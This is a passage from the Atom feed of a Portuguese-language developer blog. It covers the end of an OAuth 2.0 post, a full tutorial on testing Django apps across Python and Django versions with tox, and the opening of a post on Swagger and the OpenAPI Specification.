&lt;p&gt;&lt;a href="https://www.dropbox.com/developers/reference/oauth-guide"&gt;Leia o OAuth guide, do Dropbox&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Diferenças para o OAuth 1.0&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;OAuth 1.0&lt;/em&gt; foi baseado em protocolos proprietários, e com o passar do tempo pode-se dizer que ele "não envelheceu bem".
O &lt;em&gt;OAuth 2.0&lt;/em&gt; surgiu das lições aprendidas com o primeiro, e tem como principais melhorias:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Utilizar &lt;em&gt;HTTPS&lt;/em&gt; para todas as comunicações entre navegadores, clientes e &lt;em&gt;API&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;Melhor experiência de autorização para aplicativos nativos e suporte para extensões;&lt;/li&gt;
&lt;li&gt;A separação em papéis permite uma melhor escala de operação, uma vez que é possível tratar o &lt;em&gt;user authorization&lt;/em&gt; e
  as &lt;em&gt;API calls&lt;/em&gt; em contextos (serviços e até mesmo máquinas) diferentes.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Se até então o protocolo não ficou muito claro, não se preocupe! É na prática que o &lt;em&gt;OAuth 2.0&lt;/em&gt; começa a fazer mais sentido,
e é isso que abordaremos no próximo &lt;em&gt;post&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Entender como esse protocolo funciona é fundamental para compreender outras variações como &lt;a href="https://oauth.net/2/native-apps/"&gt;Native Apps auth&lt;/a&gt;,
&lt;a href="http://tools.ietf.org/html/rfc7522"&gt;SAML&lt;/a&gt; ou &lt;a href="https://tools.ietf.org/html/rfc7519"&gt;JWT&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://aaronparecki.com/oauth-2-simplified/"&gt;Aaron Parecki - OAuth 2 Simplified&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2"&gt;DigitalOcean - An Introduction to OAuth 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.dropbox.com/developers/reference/oauth-guide"&gt;Dropbox - OAuth guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://oauth.net/2/"&gt;Oauth.net - OAuth 2.0&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://api.slack.com/docs/oauth"&gt;Slack API - Using OAuth 2.0&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="oauth"></category><category term="oauth2"></category><category term="auth"></category><category term="apis"></category></entry><entry><title>Testando apps Django com Tox</title><link href="https://klauslaube.com.br/2018/01/05/testando-apps-django-com-tox.html" rel="alternate"></link><published>2018-01-05T17:05:00-02:00</published><updated>2018-01-05T17:05:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2018-01-05:/2018/01/05/testando-apps-django-com-tox.html</id><summary type="html">&lt;p&gt;O &lt;a href="https://docs.djangoproject.com/pt-br/2.0/releases/2.0/" title="Django 2.0 release notes"&gt;&lt;em&gt;Django 2.0&lt;/em&gt;&lt;/a&gt; foi lançado,
e com ele o suporte a &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; &lt;code&gt;2.7&lt;/code&gt; deixa de existir para
as próximas versões do &lt;em&gt;framework&lt;/em&gt;. Alegria para os usuários, preocupação para os desenvolvedores
dos &lt;a href="http://henriquebastos.net/desmistificando-o-conceito-de-django-apps/" title="Desmistificando O Conceito De Django Apps"&gt;&lt;em&gt;apps&lt;/em&gt;&lt;/a&gt;.
Afinal, a versão &lt;code&gt;1.11&lt;/code&gt; é &lt;em&gt;LTS&lt;/em&gt; (Long Term Support), logo, alguns &lt;em&gt;apps&lt;/em&gt; (ainda) não podem …&lt;/p&gt;</summary><content type="html">&lt;p&gt;O &lt;a href="https://docs.djangoproject.com/pt-br/2.0/releases/2.0/" title="Django 2.0 release notes"&gt;&lt;em&gt;Django 2.0&lt;/em&gt;&lt;/a&gt; foi lançado,
e com ele o suporte a &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; &lt;code&gt;2.7&lt;/code&gt; deixa de existir para
as próximas versões do &lt;em&gt;framework&lt;/em&gt;. Alegria para os usuários, preocupação para os desenvolvedores
dos &lt;a href="http://henriquebastos.net/desmistificando-o-conceito-de-django-apps/" title="Desmistificando O Conceito De Django Apps"&gt;&lt;em&gt;apps&lt;/em&gt;&lt;/a&gt;.
Afinal, a versão &lt;code&gt;1.11&lt;/code&gt; é &lt;em&gt;LTS&lt;/em&gt; (Long Term Support), logo, alguns &lt;em&gt;apps&lt;/em&gt; (ainda) não podem abraçar
incondicionalmente a versão &lt;code&gt;3.x&lt;/code&gt; da linguagem.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;É nesse cenário que bibliotecas como o &lt;a href="http://six.readthedocs.io/" title="Python 2 and 3 Compatibility Library"&gt;&lt;em&gt;six&lt;/em&gt;&lt;/a&gt;
e &lt;a href="https://tox.readthedocs.io/en/latest/" title="Standardize testing in Python"&gt;&lt;em&gt;tox&lt;/em&gt;&lt;/a&gt; mostram o seu valor. Nesse artigo,
vamos falar um pouquinho mais sobre a última.&lt;/p&gt;
&lt;h2&gt;Antes de começar: Vida longa ao Python 3!&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Python 2&lt;/em&gt; estará aí por mais um tempo (até 2020). Portanto, qual a motivação para mudar para o &lt;em&gt;Python 3&lt;/em&gt; agora?&lt;/p&gt;
&lt;p&gt;Na &lt;a href="https://loadsmart.com/" title="Book a truck in seconds"&gt;&lt;em&gt;Loadsmart&lt;/em&gt;&lt;/a&gt;, o nosso principal projeto é em &lt;em&gt;Python&lt;/em&gt; &lt;code&gt;2.7&lt;/code&gt;.
Mas estamos experimentando &lt;em&gt;Python&lt;/em&gt; &lt;code&gt;3.x&lt;/code&gt; há um bom tempo em projetos paralelos. O fato é que a nova versão da linguagem está mais eficiente,
possui suporte a assincronicidade, melhor controle de exceções e o fogo ardente do "unicode hell" foi controlado.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/python-snakes.jpg" width="640" height="400" title="Migrar para Python 3 pode parecer assustador. Mas é tranquilo, Indy..." alt="Migrar para Python 3 pode parecer assustador. Mas é tranquilo, Indy..."&gt;&lt;/p&gt;
&lt;p&gt;É verdade que há quebra de compatibilidade entre as versões, mas se considerarmos que a &lt;code&gt;2.7&lt;/code&gt; só tem mais 2 anos de "vida",
a urgência de migração fica mais latente.&lt;/p&gt;
&lt;h2&gt;tox é uma sacada das boas!&lt;/h2&gt;
&lt;p&gt;O site oficial da biblioteca a define como:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) a generic virtualenv management and test command line tool (...)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Com &lt;em&gt;tox&lt;/em&gt; é possível:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Validar o seu pacote contra diferentes versões do &lt;em&gt;Python&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;Rodar os seus testes em diferentes &lt;em&gt;environments&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Não é só por usar &lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre Virtualenv"&gt;&lt;em&gt;ambientes virtuais&lt;/em&gt;&lt;/a&gt; que o &lt;em&gt;tox&lt;/em&gt; é
uma boa ideia. Ele vem sendo uma mão na roda para os desenvolvedores de pacotes &lt;em&gt;Python&lt;/em&gt;
que precisam dar suporte às versões &lt;code&gt;2.x&lt;/code&gt; e &lt;code&gt;3.x&lt;/code&gt;, e que utilizam testes automatizados como
&lt;em&gt;design&lt;/em&gt; das soluções.&lt;/p&gt;
&lt;p&gt;Com o &lt;em&gt;Django&lt;/em&gt; a "granularidade" pode ser ainda maior, rodando testes em ambientes
que são combinações entre diferentes versões da linguagem e do &lt;em&gt;framework&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Antes de continuar: Travis e Build Matrix&lt;/h2&gt;
&lt;p&gt;Se você estiver utilizando o &lt;a href=""&gt;&lt;em&gt;Travis CI&lt;/em&gt;&lt;/a&gt;, poderoso serviço de Continuous Integration, consegue reproduzir o comportamento que apresentaremos
a seguir através do uso de &lt;a href="https://docs.travis-ci.com/user/customizing-the-build/#Build-Matrix" title="Customizing the build"&gt;&lt;em&gt;Build Matrix&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;A diferença é que com o &lt;em&gt;tox&lt;/em&gt;, podemos obter o mesmo comportamento em tempo de desenvolvimento. Agilizando um pouco mais o processo.&lt;/p&gt;
&lt;p&gt;Veja mais em &lt;a href="https://vevurka.github.io/dsp17/git/quality/django/python/travis_ci_frisor/" title="Setting up Travis CI for github repo in Python"&gt;"Travis CI for Python project"&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Na prática&lt;/h2&gt;
&lt;p&gt;Vou aproveitar o tema e usar o &lt;em&gt;tox&lt;/em&gt; para me ajudar em um &lt;em&gt;refactoring&lt;/em&gt; de um &lt;em&gt;app&lt;/em&gt; de
código aberto, que há muito não dou suporte: O &lt;a href="https://github.com/kplaube/django-simple-contact" title="Veja no Github"&gt;django-simple-contact&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Se você quiser acompanhar o passo-a-passo, clone o projeto e dê um &lt;code&gt;git checkout&lt;/code&gt; da &lt;em&gt;revisão&lt;/em&gt; &lt;code&gt;80145ae&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git clone git@github.com:kplaube/django-simple-contact.git
$ &lt;span class="nb"&gt;cd&lt;/span&gt; django-simple-contact/
$ git checkout 80145ae
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Na estrutura atual, é possível executar os testes através do &lt;code&gt;setup.py&lt;/code&gt; ou &lt;code&gt;python runtests.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python setup.py &lt;span class="nb"&gt;test&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt;
-----------------------------------------------
Ran &lt;span class="m"&gt;6&lt;/span&gt; tests in &lt;span class="m"&gt;0&lt;/span&gt;.230s

OK
Destroying &lt;span class="nb"&gt;test&lt;/span&gt; database &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;default&amp;#39;&lt;/span&gt;...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;É possível fazer a troca da versão do &lt;em&gt;Python/Django&lt;/em&gt; de forma manual (através do &lt;a href="https://klauslaube.com.br/tag/pyenv.html" title="Leia mais sobre pyenv"&gt;&lt;em&gt;pyenv&lt;/em&gt;&lt;/a&gt;, por exemplo).
Obviamente que o &lt;em&gt;tox&lt;/em&gt; deixa tudo mais interessante (e automatizado).&lt;/p&gt;
&lt;h3&gt;Instalando o tox&lt;/h3&gt;
&lt;p&gt;Finalmente, vamos adicionar a ferramenta ao projeto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install tox
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Caso esteja usando &lt;em&gt;pyenv&lt;/em&gt;, a instalação do &lt;code&gt;tox-pyenv&lt;/code&gt; é sugerida.
&lt;a href="https://pypi.python.org/pypi/tox-pyenv" title="tox plugin that makes tox use pyenv which to find python executables"&gt;Leia mais sobre a biblioteca&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Para deixar tudo mais organizado, vamos nos inspirar na estrutura do projeto
&lt;a href="https://github.com/vandersonmota/model_mommy" title="Object factory for django"&gt;&lt;em&gt;modelmommy&lt;/em&gt;&lt;/a&gt;. Criaremos um arquivo &lt;code&gt;requirements.txt&lt;/code&gt; com o seguinte conteúdo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;requirements&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;

&lt;span class="n"&gt;bleach&lt;/span&gt;
&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A versão &lt;code&gt;1.8.0&lt;/code&gt; (até o momento) é a &lt;em&gt;LTS&lt;/em&gt; mais antiga, portanto, garantiremos suporte dessa versão em diante.
O &lt;a href="https://pypi.python.org/pypi/bleach" title="An easy safelist-based HTML-sanitizing tool"&gt;&lt;em&gt;bleach&lt;/em&gt;&lt;/a&gt; é uma dependência do projeto, não
relevante ao exemplo desse artigo.&lt;/p&gt;
&lt;p&gt;É interessante deixarmos explícito a instalação do &lt;em&gt;tox&lt;/em&gt;... um &lt;code&gt;requirements-dev.txt&lt;/code&gt; pode ser uma solução:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;requirements&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;

&lt;span class="n"&gt;tox&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora, quando um &lt;em&gt;dev&lt;/em&gt; juntar-se ao projeto, ele poderá executar o comando &lt;code&gt;pip install -r requirements-dev.txt&lt;/code&gt;, e ter
as dependências necessárias para contribuir com o &lt;em&gt;app&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Configurando&lt;/h3&gt;
&lt;p&gt;Antes de executar a ferramenta é necessário criar um arquivo &lt;code&gt;tox.ini&lt;/code&gt;, que será responsável por configurar os ambientes
e disparar os testes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# tox.ini&lt;/span&gt;

&lt;span class="k"&gt;[tox]&lt;/span&gt;
&lt;span class="na"&gt;envlist&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;py27-django{18,111}, py36-django{18,111,20}&lt;/span&gt;

&lt;span class="k"&gt;[testenv]&lt;/span&gt;
&lt;span class="na"&gt;commands&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;python runtests.py&lt;/span&gt;
&lt;span class="na"&gt;setenv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&lt;/span&gt;
&lt;span class="s"&gt;    DJANGO_SETTINGS_MODULE=simple_contact.tests.test_settings&lt;/span&gt;
&lt;span class="s"&gt;    PYTHONPATH={toxinidir}&lt;/span&gt;
&lt;span class="na"&gt;basepython&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&lt;/span&gt;
&lt;span class="s"&gt;    py27: python2.7&lt;/span&gt;
&lt;span class="s"&gt;    py36: python3.6&lt;/span&gt;
&lt;span class="na"&gt;deps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&lt;/span&gt;
&lt;span class="s"&gt;    bleach&lt;/span&gt;
&lt;span class="s"&gt;    django18: Django==1.8&lt;/span&gt;
&lt;span class="s"&gt;    django111: Django==1.11&lt;/span&gt;
&lt;span class="s"&gt;    django20: Django==2.0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por partes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;[tox]&lt;/code&gt;: Aqui colocamos as configurações globais. &lt;code&gt;envlist&lt;/code&gt; conterá a lista de ambientes nos quais executaremos os testes.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[testenv]&lt;/code&gt;: Configurações por ambiente de teste. Poderíamos ter configurações específicas ao utilizar &lt;code&gt;[testenv:py36-django20]&lt;/code&gt;, por exemplo.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;commands&lt;/code&gt;: O comando a ser executado.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setenv&lt;/code&gt;: Variáveis de ambiente setadas para a execução dos testes.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;basepython&lt;/code&gt;: Nome do interpretador &lt;em&gt;Python&lt;/em&gt; utilizado para a criação do ambiente virtual. Repare no "match" com &lt;code&gt;py27-&lt;/code&gt; e &lt;code&gt;py36-&lt;/code&gt; do &lt;code&gt;envlist&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;deps&lt;/code&gt;: Dependências para determinado ambiente de teste. Repare no "match" com &lt;code&gt;django{18,111,20}&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Com o uso dos &lt;em&gt;brackets&lt;/em&gt;, ao invés de criarmos um &lt;code&gt;testenv&lt;/code&gt; para cada combinação (exemplo: &lt;code&gt;py27-django18&lt;/code&gt;, &lt;code&gt;py27-django111&lt;/code&gt;, &lt;code&gt;py36-django18&lt;/code&gt;, etc),
o &lt;em&gt;tox&lt;/em&gt; fica responsável por fazer a "matriz de combinações".&lt;/p&gt;
&lt;p&gt;Agora sim, podemos executar a ferramenta de linha de comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ tox
&lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt;
ERROR:   py27-django18: commands failed
ERROR:   py27-django111: commands failed
ERROR:   py36-django18: commands failed
ERROR:   py36-django111: commands failed
py36-django20: commands succeeded
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No meu ambiente local, como esperado, apenas os testes do ambiente &lt;code&gt;py36-django20&lt;/code&gt; passaram. Para ter acesso a versão corrigida,
dê um &lt;em&gt;checkout&lt;/em&gt; da revisão &lt;code&gt;a37ebd1608&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git checkout a37ebd1608
$ tox
&lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt;
py27-django18: commands succeeded
py27-django111: commands succeeded
py36-django18: commands succeeded
py36-django111: commands succeeded
py36-django20: commands succeeded
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Perfeito!&lt;/p&gt;
&lt;p&gt;Ainda é possível executar apenas os testes de um ambiente específico:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ tox -e py36-django20
&lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt;
-----------------------------------------------
Ran &lt;span class="m"&gt;6&lt;/span&gt; tests in &lt;span class="m"&gt;0&lt;/span&gt;.055s

OK
Destroying &lt;span class="nb"&gt;test&lt;/span&gt; database &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;default&amp;#39;&lt;/span&gt;...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O resultado final está disponível na &lt;em&gt;tag&lt;/em&gt; &lt;code&gt;0.3.0&lt;/code&gt; do projeto.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Que esse movimento da comunidade &lt;em&gt;Django&lt;/em&gt; consiga influenciar ainda mais a adoção do &lt;em&gt;Python 3&lt;/em&gt;. Admito que sem essa
"motivação extra", dificilmente cogitaria o &lt;em&gt;upgrade&lt;/em&gt; da linguagem em meus projetos nesse momento.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;tox&lt;/em&gt; é sem dúvida uma ferramenta que pode auxiliar nessa fase de transição, portanto, não hesite em adicioná-la ao seu &lt;em&gt;toolbelt&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para uma integração &lt;em&gt;seamless&lt;/em&gt; com o &lt;em&gt;Travis CI&lt;/em&gt;, o &lt;a href="https://github.com/tox-dev/tox-travis" title="Seamless integration of Tox into Travis CI"&gt;&lt;em&gt;tox-travis&lt;/em&gt;&lt;/a&gt;
é recomendado.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.activestate.com/blog/2017/01/python-3-vs-python-2-its-different-time"&gt;ActiveState - Python 3 vs Python 2: It's different this time&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://henriquebastos.net/desmistificando-o-conceito-de-django-apps/"&gt;Henrique Bastos - Desmistificando O Conceito De Django Apps&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://jsatt.com/blog/using-tox-with-travis-ci-to-test-django-apps/"&gt;Jeremy Satterfield - Using Tox with Travis CI to Test Django Apps&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://vevurka.github.io/dsp17/git/quality/django/python/travis_ci_frisor/"&gt;vevurka-dev - Travis CI for Python project&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="testes"></category><category term="tdd"></category><category term="tox"></category><category term="django"></category><category term="python"></category><category term="virtualenv"></category></entry><entry><title>Swagger e o Open API Initiative</title><link href="https://klauslaube.com.br/2017/11/25/swagger-e-o-open-api-initiative.html" rel="alternate"></link><published>2017-11-25T20:52:00-02:00</published><updated>2017-11-25T20:52:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2017-11-25:/2017/11/25/swagger-e-o-open-api-initiative.html</id><summary type="html">&lt;p&gt;Já falamos sobre &lt;a href="https://klauslaube.com.br/tag/raml.html" title="Leia mais sobre RAML"&gt;&lt;em&gt;RAML&lt;/em&gt;&lt;/a&gt; aqui no &lt;em&gt;blog&lt;/em&gt;. Uma maneira
de descrever &lt;em&gt;APIs&lt;/em&gt;, facilitando a vida de clientes, fornecedores, e até mesmo
máquinas. Acontece que há uma alternativa muito mais popular,
chamada &lt;a href="https://swagger.io/" title="The world's most popular API tooling"&gt;&lt;em&gt;Swagger&lt;/em&gt;&lt;/a&gt;,
que na minha opinião tem por principal ponto positivo ser base para a criação da
&lt;a href="https://github.com/OAI/OpenAPI-Specification" title="The OpenAPI Spec repository"&gt;&lt;em&gt;OpenAPI Specification&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Se …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Já falamos sobre &lt;a href="https://klauslaube.com.br/tag/raml.html" title="Leia mais sobre RAML"&gt;&lt;em&gt;RAML&lt;/em&gt;&lt;/a&gt; aqui no &lt;em&gt;blog&lt;/em&gt;. Uma maneira
de descrever &lt;em&gt;APIs&lt;/em&gt;, facilitando a vida de clientes, fornecedores, e até mesmo
máquinas. Acontece que há uma alternativa muito mais popular,
chamada &lt;a href="https://swagger.io/" title="The world's most popular API tooling"&gt;&lt;em&gt;Swagger&lt;/em&gt;&lt;/a&gt;,
que na minha opinião tem por principal ponto positivo ser base para a criação da
&lt;a href="https://github.com/OAI/OpenAPI-Specification" title="The OpenAPI Spec repository"&gt;&lt;em&gt;OpenAPI Specification&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Se até aqui tudo isso pareceu "sopa de letrinhas", &lt;em&gt;keep calm&lt;/em&gt;! Vamos abrir o glossário e detalhar
termo por termo.&lt;/p&gt;
&lt;h2&gt;Swagger: Um framework completo&lt;/h2&gt;
&lt;p&gt;As vantagens de utilizar o &lt;em&gt;Swagger&lt;/em&gt; são basicamente as mesmas de usar &lt;em&gt;RAML&lt;/em&gt; (ou
&lt;a href="https://apiblueprint.org/" title="Powerful high-level API description language"&gt;&lt;em&gt;API Blueprint&lt;/em&gt;&lt;/a&gt;):
Modelar e documentar &lt;em&gt;APIs&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/rest.html" title="Leia mais sobre REST"&gt;&lt;em&gt;REST&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Swagger&lt;/em&gt; é um &lt;em&gt;framework&lt;/em&gt;, composto por diferentes ferramentas, que ajudam no desenvolvimento
de &lt;em&gt;APIs&lt;/em&gt;. Dentre essas ferramentas podemos destacar as de código aberto:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://swagger.io/swagger-editor/" title="Design, describe, and document your API on the first open source editor fully dedicated to Swagger-based APIs"&gt;&lt;em&gt;Swagger Editor&lt;/em&gt;&lt;/a&gt;:
  Um editor poderosíssimo que pode ser usado &lt;em&gt;online&lt;/em&gt;, e que facilita (e muito) na escrita de arquivos
  &lt;em&gt;Swagger&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://swagger.io/swagger-ui/"&gt;&lt;em&gt;Swagger UI&lt;/em&gt;&lt;/a&gt;:
  Uma plataforma para a geração e publicação da documentação de &lt;em&gt;APIs&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://swagger.io/swagger-codegen/"&gt;&lt;em&gt;Swagger Codegen&lt;/em&gt;&lt;/a&gt;: Esse aqui é o meu favorito. Através
  da especificação da sua &lt;em&gt;API&lt;/em&gt;, cria &lt;em&gt;SDKs&lt;/em&gt; para diferentes linguagens.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://swagger.io/swagger-inspector/"&gt;&lt;em&gt;Swagger Inspector&lt;/em&gt;&lt;/a&gt;: Para fechar com chave de ouro.
  O &lt;em&gt;Inspector&lt;/em&gt; é um serviço que testa &lt;em&gt;APIs&lt;/em&gt; com base em um contrato &lt;em&gt;Swagger&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Além disso temos o &lt;a href="https://swaggerhub.com/" title="The platform for designing and documenting APIs with Swagger"&gt;&lt;em&gt;SwaggerHub&lt;/em&gt;&lt;/a&gt;,
que "empacota" isso tudo em um &lt;em&gt;Software As A Service&lt;/em&gt;, prometendo aumentar produtividade e
colaboração entre times no que tange desenvolvimento de &lt;em&gt;APIs&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Nos items acima citei "arquivos &lt;em&gt;Swagger&lt;/em&gt;" e "contrato &lt;em&gt;Swagger&lt;/em&gt;". Bem...
hoje o &lt;em&gt;Swagger&lt;/em&gt; (&lt;em&gt;framework&lt;/em&gt;) é apto a trabalhar com o &lt;em&gt;Swagger&lt;/em&gt; (especificação). Mas não
é apenas essa especificação que ele suporta.&lt;/p&gt;
&lt;p&gt;E é aqui que a &lt;em&gt;SmartBear&lt;/em&gt; (empresa por trás do desenvolvimento da "marca" &lt;em&gt;Swagger&lt;/em&gt;) aparece e merece aplausos.&lt;/p&gt;
&lt;h2&gt;Swagger Specification vira OpenAPI Specification&lt;/h2&gt;
&lt;p&gt;Deixa eu corrigir o primeiro parágrafo do capítulo anterior:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As vantagens de utilizar o &lt;em&gt;OpenAPI Spec&lt;/em&gt; são basicamente as mesmas de usar &lt;em&gt;RAML Spec&lt;/em&gt;,
&lt;em&gt;Swagger Spec&lt;/em&gt;, ou &lt;em&gt;API Blueprint Spec&lt;/em&gt;: Modelar e documentar &lt;em&gt;APIs&lt;/em&gt; &lt;em&gt;REST&lt;/em&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Com uma vantagem a mais: Ser aberta*. (note o asterisco)&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Swagger Specification&lt;/em&gt; desde o seu princípio é de código aberto. Mas sempre teve uma empresa
vinculada ao seu desenvolvimento (mais ou menos o que acontece com a &lt;a href="https://www.mulesoft.com/" title="We connect. You unnovate."&gt;&lt;em&gt;MuleSoft&lt;/em&gt;&lt;/a&gt;
e o &lt;em&gt;RAML&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Em janeiro de 2016, a &lt;em&gt;SmartBear Software&lt;/em&gt; renomeou a &lt;em&gt;Swagger Specification&lt;/em&gt; para &lt;em&gt;OpenAPI Specification&lt;/em&gt;.
Disponibilizando-a no &lt;em&gt;Github&lt;/em&gt; em &lt;a href="https://github.com/OAI/OpenAPI-Specification" title="The OpenAPI Specification Repository"&gt;github.com/OAI/OpenAPI-Specification&lt;/a&gt;,
e tornando-a assim em uma especificação "vendor-neutral".&lt;/p&gt;
